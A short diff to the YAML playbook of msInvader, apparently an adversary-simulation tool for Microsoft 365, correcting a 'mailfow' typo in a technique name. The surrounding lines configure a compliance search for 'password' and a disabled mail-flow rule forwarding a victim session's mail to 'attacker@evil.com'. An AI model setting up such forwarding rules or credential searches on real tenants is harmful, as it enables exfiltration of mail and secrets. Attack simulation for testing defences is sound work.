@@ -71,10 +71,10 @@ playbooks:
           keyword : "password"
           name : "msInvader 365 compliance search"
                                       
-      - technique: "create_mailfow_rule"
+      - technique: "create_mailflow_rule"
         enabled: False
         parameters:
           session: "victim2"
           access_method: "rest"
           forward_to : "attacker@evil.com"
-          name : "msInvader mailfow rule"
+          name : "msInvader mailflow rule"
